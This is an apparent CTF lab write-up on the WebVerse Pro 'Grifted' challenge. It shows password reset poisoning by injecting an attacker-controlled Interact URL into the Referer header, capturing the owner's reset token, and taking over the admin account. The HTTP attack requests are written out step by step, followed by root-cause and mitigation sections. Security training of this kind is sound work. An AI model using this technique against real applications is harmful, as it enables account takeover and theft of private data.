---
title: "Password Reset Poisoning via Referer Header Injection | Grifted"
date: 2026-06-14 13:15:00 +0530
categories: [A07 - Authentication Failures, Password Reset Poisoning]
tags: [password-reset-poisoning, referer-header-injection, authentication-failures, account-takeover, webverselabs-pro, ctf]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/grifted-password-reset-poisoning.webp
  alt: Grifted - Password Reset Poisoning via Referer Header Injection
---

## Lab Link

Lab: [Grifted](https://dashboard.webverselabs-pro.com/mystery-challenges/Grifted)

---

## Overview

**Gifted** is a WebVerse Pro daily challenge based on a booking website for **Madame Renata**, a fortune-telling and reading service.

At first glance, the public website only exposes basic pages such as readings, testimonials, about, and a contact form. However, the challenge briefing hints that the real objective is hidden in a private back office:

> Renata's booking site looks the part, yet the whole operation is a polished grift: the testimonials are staged and the "gift" is cold reading. She runs it from a back office she is sure nobody can reach. Find your way in and read the books for yourself.

The final vulnerability was **Password Reset Poisoning via Referer Header Injection**. The application generated password reset links using attacker-controlled request metadata. By poisoning the `Referer` header with a WebVerse Interact URL, the reset token for the back-office owner account was leaked externally.

---

## Objective

The objective of the lab was to gain access to the hidden back-office area and retrieve the challenge flag.

---

## Vulnerability Identification

The application was vulnerable to **Password Reset Poisoning via Referer Header Injection**.

```text
OWASP Top 10:2025
└── A07 - Authentication Failures
    └── Password Reset Poisoning
        └── Attacker-controlled Referer header used to generate reset URL
            └── Reset token leaked to external Interact server
```

The issue existed because the reset link was not generated from a trusted server-side base URL. Instead, the application trusted request metadata supplied by the client.

---

## Reconnaissance

Initial enumeration of the public site revealed a simple PHP application with the following pages:

```text
/readings.php
/about.php
/testimonials.php
/contact.php
```

The contact page allowed users to submit a booking request:

```http
POST /contact.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<SESSION>

name=kelvin&email=kelvin%40kel.com&reading=Tarot&message=test
```

The application returned a confirmation message:

```html
<div class="form-ok">
  Thank you — your request has reached Madame Renata.
  She will write back to confirm your reading within one working day.
</div>
```

At first, blind XSS was tested because the platform provided an Interact server. However, the useful hint came from the Interact request itself. The Interact server showed a request for:

```text
/favicon.ico
```

The headers in that request showed how the Interact domain could be reused as attacker-controlled request metadata.

---

## Hidden Back Office Discovery

The briefing mentioned a private back office, so the `/admin/` path was tested.

```http
GET /admin/ HTTP/1.1
Host: <LAB_HOST>
Cookie: PHPSESSID=<SESSION>
```

The server redirected to the admin login page:

```http
HTTP/1.1 302 Found
Location: /admin/login.php
```

The admin login page was then requested:

```http
GET /admin/login.php HTTP/1.1
Host: <LAB_HOST>
Cookie: PHPSESSID=<SESSION>
```

The login page contained a password reset link:

```html
<a href="/admin/forgot.php">Forgot your password?</a>
```

This revealed the reset endpoint:

```text
/admin/forgot.php
```

---

## Target Account Identification

The public contact page exposed Madame Renata's business email address through Cloudflare email protection.

After decoding the protected email, the likely owner account was identified as:

```text
renata@madamerenata.co
```

Since the back office belonged to Madame Renata, this became the target account for the reset poisoning attack.

---

## Exploitation

The password reset page accepted an email address:

```http
GET /admin/forgot.php HTTP/1.1
Host: <LAB_HOST>
Cookie: PHPSESSID=<SESSION>
```

The form submitted to the same endpoint:

```html
<form method="post">
  <input type="email" name="email" required>
  <button type="submit">Send reset link</button>
</form>
```

A normal reset request used the real application as the referrer:

```http
POST /admin/forgot.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Origin: https://<LAB_HOST>
Referer: https://<LAB_HOST>/admin/forgot.php
Cookie: PHPSESSID=<SESSION>

email=renata%40madamerenata.co
```

The response returned a generic success message:

```html
<div class="adm-ok">
  If that address is on file, a reset link is on its way.
  Follow the link in your email to choose a new password.
</div>
```

To poison the reset link, the `Referer` header was replaced with the Interact server URL:

```http
POST /admin/forgot.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Origin: https://<LAB_HOST>
Referer: http://<INTERACT_HOST>/
Cookie: PHPSESSID=<SESSION>

email=renata%40madamerenata.co
```

Because the application trusted the `Referer` header while constructing the reset link, the reset URL was generated using the Interact domain instead of the real application domain.

---

## Reset Token Capture

After sending the poisoned reset request, the Interact server received a request from the application mailer:

```http
GET /admin/reset.php?token=<REDACTED_RESET_TOKEN> HTTP/1.1
Host: <INTERACT_HOST>
User-Agent: MadameRenata-Mail/1.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

This confirmed that the reset token had been leaked to the attacker-controlled Interact server.

The token path was then copied from Interact and used on the real lab host:

```text
https://<LAB_HOST>/admin/reset.php?token=<REDACTED_RESET_TOKEN>
```

This opened the password reset form for Madame Renata's account.

A new password was set for the owner account.

---

## Admin Login

After resetting the password, the back-office login form was used:

```http
POST /admin/login.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded
Origin: https://<LAB_HOST>
Referer: https://<LAB_HOST>/admin/login.php
Cookie: PHPSESSID=<SESSION>

email=renata%40madamerenata.co&password=<NEW_PASSWORD>
```

The server responded with a successful redirect:

```http
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=<NEW_ADMIN_SESSION>; path=/
Location: /admin/index.php
```

Following the redirect provided access to the back-office dashboard:

```http
GET /admin/index.php HTTP/1.1
Host: <LAB_HOST>
Cookie: PHPSESSID=<NEW_ADMIN_SESSION>
```

The dashboard confirmed owner-level access:

```html
<h1>Good evening, Madame Renata</h1>
<span class="adm-pill">Owner</span>
```

---

## Proof of Exploitation

Inside the admin dashboard, the private booking and licensing area was visible.

The page contained the account and licensing section:

```html
<div class="adm-card-lg adm-license">
  <h2>Account &amp; licensing</h2>
  <span class="adm-tag adm-tag-restricted">Private</span>
</div>
```

The challenge flag was shown as the booking-platform license key:

```html
<code class="flag">WEBVERSE{...}</code>
```

Sensitive values such as the full reset token, session cookies, live hostnames, and the complete flag have been redacted.

---

## Root Cause Analysis

The password reset flow generated reset links using an attacker-controlled request header.

Instead of relying on a fixed trusted application URL, the backend appeared to use the incoming `Referer` value when constructing the reset link.

A vulnerable implementation may look conceptually like this:

```php
$base = $_SERVER['HTTP_REFERER'];
$link = $base . "/admin/reset.php?token=" . $token;
```

This is dangerous because headers such as `Referer`, `Host`, `Origin`, and `X-Forwarded-Host` can often be modified by the client.

In this lab, poisoning the `Referer` header caused the reset email/link generation process to send the reset token to the attacker-controlled Interact domain.

---

## Impact

The impact of this vulnerability was full account takeover of the back-office owner account.

An attacker could:

- Trigger a password reset for a known user.
- Poison the generated reset URL.
- Capture the reset token externally.
- Reset the victim's password.
- Log in as the victim.
- Access private business data.
- Retrieve sensitive account or licensing information.

In this lab, the compromised account belonged to Madame Renata and had owner-level access to the back office.

---

## Mitigation

Password reset links should always be generated using a trusted server-side base URL.

Recommended fixes include:

- Do not build reset URLs from `Referer`, `Origin`, `Host`, or `X-Forwarded-Host` unless those values are strictly validated.
- Store the canonical application URL in server-side configuration.
- Use an allowlist of trusted hosts when reverse proxies are involved.
- Treat password reset tokens as sensitive secrets.
- Make reset tokens single-use and short-lived.
- Log suspicious reset requests containing unexpected host or referrer values.
- Avoid leaking whether an email address exists in the system.
- Notify users after password reset events.

A safer implementation would generate reset links using a trusted server-side value:

```php
$baseUrl = getenv('APP_BASE_URL');
$link = $baseUrl . "/admin/reset.php?token=" . urlencode($token);
```

Where `APP_BASE_URL` is configured on the server and cannot be controlled by the client.

---

## Real-World Insight

Password reset poisoning is a subtle but high-impact authentication flaw. The application may appear to have a normal password reset process, but if the reset link is generated using attacker-controlled headers, the entire account recovery mechanism can become an account takeover primitive.

This type of vulnerability is especially dangerous because it often does not require XSS, SQL injection, or brute force. The attacker only needs to know or guess the victim's email address and influence the URL used in the reset link.

In real-world applications, password reset flows should be treated as highly sensitive authentication boundaries. Any user-controllable data used in reset link generation should be considered dangerous unless explicitly validated and trusted.

---

## Final Exploit Chain

```text
Discovered /admin/
        ↓
Redirected to /admin/login.php
        ↓
Found /admin/forgot.php
        ↓
Identified owner email: renata@madamerenata.co
        ↓
Poisoned Referer header with Interact URL
        ↓
Triggered password reset
        ↓
Captured /admin/reset.php?token=<REDACTED> on Interact
        ↓
Used token on real lab host
        ↓
Reset owner password
        ↓
Logged in to /admin/index.php
        ↓
Read private back-office licensing data
        ↓
Retrieved flag
```

## Conclusion

The **Gifted** challenge demonstrated how a weak password reset implementation can lead to complete account takeover.

By trusting the `Referer` header while generating password reset links, the application allowed an attacker to redirect the reset token to an external Interact server. Once the token was captured, the attacker could reset the owner's password, access the back office, and retrieve the private license key containing the challenge flag.
